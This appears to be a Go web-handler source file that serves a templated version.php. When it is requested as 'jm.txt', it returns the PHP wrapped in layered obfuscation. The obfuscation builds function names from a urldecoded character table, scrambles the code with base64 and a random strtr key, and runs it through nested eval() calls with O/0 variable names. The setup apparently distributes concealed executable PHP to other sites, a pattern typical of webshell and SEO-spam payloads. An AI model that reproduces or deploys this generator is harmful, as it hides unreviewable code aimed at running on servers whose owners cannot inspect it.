package apis

import (
	"bytes"
	"encoding/base64"
	"github.com/LINQQ1212/common/global"
	"github.com/LINQQ1212/common/response"
	"github.com/LINQQ1212/common/utils"
	"github.com/gin-gonic/gin"
	"os"
	"path"
	"regexp"
	"strconv"
	"strings"
)

func VersionPHP(c *gin.Context) {
	b, err := os.ReadFile(path.Join(global.CONFIG.System.MainDir, "version.php"))
	if err != nil {
		response.DataMain500(c)
		return
	}
	arr := strings.Split(c.Request.Host, ".")

	b = bytes.ReplaceAll(b, []byte("{version}"), []byte(arr[0]))
	Scheme := "http"
	if c.Request.URL.Scheme != "" {
		Scheme = c.Request.URL.Scheme
	}
	domain := strings.TrimSuffix(c.Request.Host, ":"+strconv.Itoa(global.CONFIG.System.AdminAddr))
	if global.CONFIG.System.Addr != 80 {
		domain += ":" + strconv.Itoa(global.CONFIG.System.Addr)
	}
	b = bytes.ReplaceAll(b, []byte("{domain}"), []byte(Scheme+"://"+domain))
	if strings.Contains(c.Request.URL.Path, "jm.txt") {
		c.Writer.WriteString(Encrypt2(arr[0], string(b)))
		return
	}
	c.Writer.Write(b)
}

const char5 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

func Encrypt2(v, str string) string {
	str = regexp.MustCompile(`\s{2,}`).ReplaceAllString(str, " ")
	T_k1 := utils.RandomStr(char5)
	T_k2 := utils.RandomStr(char5)
	str = strings.TrimSpace(str)
	v1 := base64.StdEncoding.EncodeToString([]byte(str))
	c := Strtr(v1, T_k1, T_k2)
	c = T_k1 + T_k2 + c
	q1 := "O00O0O"
	q2 := "O0O000"
	q3 := "O0OO00"
	q4 := "OO0O00"
	q5 := "OO0000"
	q6 := "O00OO0"
	s := "$a='" + v + "';$" + q6 + "=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\");$" + q1 + "=$" + q6 + "[3].$" + q6 + "[6].$" + q6 + "[33].$" + q6 + "[30];$" + q3 + "=$" + q6 + "[33].$" + q6 + "[10].$" + q6 + "[24].$" + q6 + "[10].$" + q6 + "[24];$" + q4 + "=$" + q3 + "[0].$" + q6 + "[18].$" + q6 + "[3].$" + q3 + "[0].$" + q3 + "[1].$" + q6 + "[24];$" + q5 + "=$" + q6 + "[7].$" + q6 + "[13];$" + q1 + ".=$" + q6 + "[22].$" + q6 + "[36].$" + q6 + "[29].$" + q6 + "[26].$" + q6 + "[30].$" + q6 + "[32].$" + q6 + "[35].$" + q6 + "[26].$" + q6 + "[30];eval($" + q1 + "(\"" + base64.StdEncoding.EncodeToString([]byte("$"+q2+"=\""+c+"\";eval(\"?>\".$"+q1+"($"+q3+"($"+q4+"($"+q2+",$"+q5+"*2),$"+q4+"($"+q2+",$"+q5+",$"+q5+"),$"+q4+"($"+q2+",0,$"+q5+"))));")) + "\"));"
	return `<?php
` + s + "\n?>"
}

func Strtr(haystack string, params ...interface{}) string {
	ac := len(params)
	if ac == 1 {
		pairs := params[0].(map[string]string)
		length := len(pairs)
		if length == 0 {
			return haystack
		}
		oldnew := make([]string, length*2)
		for o, n := range pairs {
			if o == "" {
				return haystack
			}
			oldnew = append(oldnew, o, n)
		}
		return strings.NewReplacer(oldnew...).Replace(haystack)
	} else if ac == 2 {
		from := params[0].(string)
		to := params[1].(string)
		trlen, lt := len(from), len(to)
		if trlen > lt {
			trlen = lt
		}
		if trlen == 0 {
			return haystack
		}

		str := make([]uint8, len(haystack))
		var xlat [256]uint8
		var i int
		var j uint8
		if trlen == 1 {
			for i = 0; i < len(haystack); i++ {
				if haystack[i] == from[0] {
					str[i] = to[0]
				} else {
					str[i] = haystack[i]
				}
			}
			return string(str)
		}
		// trlen != 1
		for {
			xlat[j] = j
			if j++; j == 0 {
				break
			}
		}
		for i = 0; i < trlen; i++ {
			xlat[from[i]] = to[i]
		}
		for i = 0; i < len(haystack); i++ {
			str[i] = xlat[haystack[i]]
		}
		return string(str)
	}

	return haystack
}
